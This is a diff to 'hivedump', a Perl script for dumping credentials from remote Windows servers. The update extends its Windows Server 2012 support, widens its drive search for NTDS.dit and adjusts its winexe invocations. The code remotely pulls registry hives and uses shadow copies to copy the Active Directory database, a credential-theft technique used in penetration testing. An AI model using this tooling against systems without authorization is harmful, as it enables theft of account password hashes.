@@ -3,7 +3,7 @@
 ##########################################################################
 #
 #    hivedump: Safely dump credentials in Linux from remote Windows servers 
-#    Copyright (C) 2014 Jonathan Roach
+#    Copyright (C) 2014-2016 Jonathan Roach
 #
 #    This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU General Public License as published by
@@ -26,7 +26,7 @@ use strict;
 
 my ($host,$user,$pass);
 
-my $VERSION="1.1";
+my $VERSION="1.3";
 
 if (exists($ENV{'IP'})){
 	($user,$pass)=@ARGV;
@@ -99,7 +99,7 @@ for my $hive ("SAM","SECURITY","SYSTEM"){
 	push @RESULTS,$hive . ".hive";
 }
 
-if ($OS =~ /2003/ || $OS =~ /2008/){
+if ($OS =~ /2003/ || $OS =~ /2008/ || $OS =~ /2012/){
 	# See if we can find NTDS.dit and get that using the Volume Shadow Copy Service
 	my $result=rbacktick("vssadmin.exe /?");
 	if ($result =~ /is not recognized as an internal or external command/){
@@ -107,7 +107,7 @@ if ($OS =~ /2003/ || $OS =~ /2008/){
 	} else {
 		print "   Looking for NTDS.dit\n";
 		my $found=0; my $NTDS;
-		my @paths=("C:\\Windows\\NTDS","D:\\Windows\\NTDS");
+		my @paths=("C:\\Windows\\NTDS","D:\\Windows\\NTDS","E:\\Windows\\NTDS","F:\\Windows\\NTDS","G:\\Windows\\NTDS");
 		for my $path (@paths){
 			my $result=rbacktick("dir ${path}\\ntds.dit");
 			#print "Result: $result\n";
@@ -140,15 +140,16 @@ if ($OS =~ /2003/ || $OS =~ /2008/){
 				# We'll have to set up our own
 				print " - None found. Creating Volume Shadow Copy for $drive:\n";
 				my $result=rbacktick("vssadmin create shadow /for=$drive:");
-				if ($result =~ /Shadow Copy Volume Name: (\\\\\?\\GLOBALROOT\S+)\s/) {
+				if ($result =~ m/Shadow Copy Volume Name: (\\\\\?\\GLOBALROOT\S+)\s/) {
 					$volume=$1;
-					if ($result =~ /Shadow Copy ID: (\{\S+\})/){
+					if ($result =~ m/Shadow Copy ID: (\{\S+\})/){
 						$vssid=$1;
 					}
 					$created=1;
 					print " + Successfully created VSS volume for $drive:\n";
 				} else {
 					print STDERR "Failed to create VSS for $drive:\n";
+				  print STDERR "Result was:\n$result";
 				}
 			}
 
@@ -215,7 +216,7 @@ exit $ERROR;
 #------------------------------------------------------------------------------------------------------------------------------------------------
 
 sub authenticate {
-	my $return=`winexe --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ver\" 2>&1`;
+	my $return=`winexe -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ver\" 2>&1`;
 
 	if ($return =~ /NT_STATUS_LOGON_FAILURE/i){
 		print STDERR "Logon failure\n";
@@ -235,30 +236,40 @@ sub authenticate {
 		$OS="2000";
 	} elsif ($return =~ /Windows XP/i){
 		$OS="XP";
+	} elsif ($return =~ /Windows \[Version 6.1.7601/i){
+		$OS="7";
 	} elsif ($return =~ /Windows \[Version 6.1./i){
 		$OS="2008";
 	} elsif ($return =~ /Windows \[Version 6.0./i){
 		$OS="Vista";
+	} elsif ($return =~ /Windows \[Version 6.3.9600/i){
+		$OS="2012";
+	} elsif ($return =~ /Windows \[Version 6.3./i){
+		$OS="2012";
+	} else {
+		$return =~ s/\r//g;
+		print "UNRECOGNISED OS: \"$return\"\n";
+		$OS=undef;
 	}
 	return 1;
 }
 
 sub rbacktick {
 	my $cmd=shift();
-	my @result=`winexe --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c \\\"cd \%WINDIR\%\\${REMOTE_DIR} \& ${cmd}\\\"\" 2>&1`;
+	my @result=`winexe -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c \\\"cd \%WINDIR\%\\${REMOTE_DIR} \& ${cmd}\\\"\" 2>&1`;
 	return join ("",@result);
 }
 
 sub rexec {
 	my $cmd=shift();
-	my $rc=system("winexe --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c \\\"cd \%WINDIR\%\\${REMOTE_DIR} \& ${cmd}\\\"\"");
+	my $rc=system("winexe -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c \\\"cd \%WINDIR\%\\${REMOTE_DIR} \& ${cmd}\\\"\"");
 	$rc=$rc>>8;
 	return $rc;
 }
 
 sub silentRexec {
 	my $cmd=shift();
-	my $rc=system("winexe  --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c \\\"cd \%WINDIR\%\\${REMOTE_DIR} \& ${cmd}\\\"\" >/dev/null 2>&1");
+	my $rc=system("winexe  -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c \\\"cd \%WINDIR\%\\${REMOTE_DIR} \& ${cmd}\\\"\" >/dev/null 2>&1");
 	$rc=$rc>>8;
 	return $rc;
 }
@@ -276,7 +287,7 @@ sub cleanup {
 	# Clean up the winexe service - delete the service
 	#silentRexec("cmd.exe /c ghsc.exe delete winexesvc"); 
 	#silentRexec("cmd.exe /c net stop winexesvc");
-	system("winexe --uninstall --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ver\" >/dev/null 2>&1");
+	system("winexe --uninstall -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ver\" >/dev/null 2>&1");
 	for my $file (@FILES){
 		rdel($file);
 	}
